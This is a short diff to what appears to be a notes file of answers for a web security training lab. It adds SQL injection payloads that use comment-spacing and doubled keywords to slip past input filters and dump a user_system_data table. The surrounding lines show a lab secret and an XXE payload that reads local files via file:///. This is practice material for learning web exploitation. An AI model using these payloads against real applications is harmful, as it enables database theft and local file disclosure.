@@ -41,6 +41,12 @@ A1-2-5
 tom
 thisisasecretfortomonly
 
+A1-3-9
+a';/**/select/**/*/**/from/**/user_system_data;--
+
+A1-3-10
+a';/**/seselectlect/**/*/**/frfromom/**/user_system_data;--
+
 xxe 4:
 <?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>
 
